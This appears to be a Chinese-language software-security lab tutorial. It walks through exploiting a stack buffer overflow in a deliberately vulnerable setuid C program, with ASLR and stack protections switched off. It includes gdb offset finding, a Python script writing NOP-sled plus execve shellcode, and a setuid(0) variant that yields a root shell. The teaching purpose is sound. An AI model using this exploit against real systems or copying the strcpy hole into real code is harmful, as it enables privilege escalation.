#
#### 漏洞程序
以下程序是特权程序
```
// stack.c
# include <string.h>
# include <stdio.h>

int foo(char *str)
{
    char buffer[100];
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char const *argv[])
{
    char str[400];
    FILE *badfile;
    
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 300, badfile);
    foo(str);

    printf("it's ok!");
    return 0;
}

```
程序打开了badfile文件读取300字节的数据，然后复制到100字节的buffer中，这显然会溢出。只要badfile中的内容溢出修改foo函数执行完成后的返回地址变成恶意代码存放的地址,那攻击者就能拿到root权限。


**为了实验成功先关闭一些防御措施。**
```
ubuntu@VM-0-17-ubuntu:~$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
```
使用`-z execstack`和`-fno-stack-protector`参数编译
```
ubuntu@VM-0-17-ubuntu:~$ gcc -o stack -z execstack -fno-stack-protector stack.c 
ubuntu@VM-0-17-ubuntu:~$ sudo chown root stack
ubuntu@VM-0-17-ubuntu:~$ sudo chmod 4755 stack
ubuntu@VM-0-17-ubuntu:~$ vi badfile 
ubuntu@VM-0-17-ubuntu:~$ ./stack 
it's ok!
```


!!! randomize_va_space
    关闭空间随机化 0=关闭  1=栈随机  2=堆和栈都随机   可以通过`ldd /bin/bash`来查看动态库加载的地址是否相同


!!! execstack
    gcc默认会给执行文件打上一个特殊标志，告诉系统它的栈是不可执行的。可以通过return-to-libc绕过。  
    

!!! -fno-stack-protector
    关闭了一个为StackGuard的保护机制。它是一个通过在代码中添加一些特殊的数据和检测机制而防御缓冲区溢出攻击。就是在缓冲区到返回地址之间放一个不可预测的值(称为哨兵)，然后在函数返回前检查这个值是否被修改了。

!!! 64位系统编译32位程序
    sudo apt-get install build-essential module-assistant
    sudo apt-get install gcc-multilib g++-multilib
    gcc -m32 hello.c
    
    
#### 通过调试找到返回地址

![](/software-security/img/buffer5.png)

编译加上参数-g
```
ubuntu@VM-0-17-ubuntu:~$ gcc -o stack_gdb -z execstack -fno-stack-protector -g stack.c 
ubuntu@VM-0-17-ubuntu:~$ gdb stack_gdb 

(gdb) b foo
Breakpoint 1 at 0x80484c1: file stack.c, line 7.
(gdb) run
Starting program: /home/ubuntu/stack_gdb 

Breakpoint 1, foo (str=0xbffff46c 'a' <repeats 200 times>...) at stack.c:7
7	    strcpy(buffer, str);
(gdb) p $ebp
$1 = (void *) 0xbffff448
(gdb) p &buffer
$2 = (char (*)[100]) 0xbffff3dc
(gdb) p/d 0xbffff448 - 0xbffff3dc
$3 = 108
```
帧指针的值是0xbffff448，因此可以得出返回地址是 0xbffff448 + 4  
从上面调试出来的数据可以看到ebp到buffer的起始处距离是108  
因此返回地址到buffer的距离就是112，也就是112-116这个区间是返回地址  

!!! note
    b 设置断点  
    run运行到断点处  
    p打印  $ebp &buffer 注意$和&的区别  
    p/d以10进制打印  

    

#### 构造输入文件
![](/software-security/img/buffer7.png)  

![](/software-security/img/buffer6.png)


```
shellcode = (
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80"
).encode('latin-1')
content = bytearray(0x90 for i in range(300))  # 用0x90(NOP)填充整个数组
start = 300 - len(shellcode)
content[start:] = shellcode  # shellcode放在数组最后

ret = 0xbffff448 + 100  # 恶意代码位置
content[112:116] = (ret).to_bytes(4, byteorder='little')  # 把恶意代码位置放入栈中的返回地址中
file = open("badfile", "wb")
file.write(content)
file.close()
```
`ret = 0xbffff448 + 100`不一定非要+100，只要是ebp的地址与恶意代码位置之间都可以，因为有NOP指令    
NOP指令什么都不做，它只是告诉cpu继续往前走  
但是0xbffff448 + n 字节中不能包含0，因为如果在badfile中有0，`strcpy`函数会提前结束复制行为。  
    

```
ubuntu@VM-0-17-ubuntu:~$ ./stack
$ id
uid=500(ubuntu) gid=500(ubuntu) groups=500(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare)
```
可以看到利用溢出成功执行了shell  
但是由于Ubuntu 16.04以上版本，/bin/sh实际上是一个指向的是有保护措施(比对有效用户和真实用户)的/bin/dash，没有成功拿到有哦root权限的shell  


#### 攻破Dash的保护机制
由于是因为比对有效用户和真实用户的方式保护的，所以只需要在sh执行之前把真实用户id改为0即可。  

因此修改shellcode加入setuid(0)
```
shellcode = (
    "\x31\xc0"
    "\x31\xdb"
    "\xb0\xd5"
    "\xcd\x80"
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80"
).encode('latin-1')
```
shellcode加入了四条指令，也就是最上面第四条。  
前三条是将ebx设置为0，并让eax等于0xd5(这个值是setuid()),第四条指令是执行setuid(0)系统调用  
```
ubuntu@VM-0-17-ubuntu:~$ ./stack
# id
uid=0(root) gid=500(ubuntu) groups=500(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare)
# 
```
再次执行成功拿到有root权限的shell



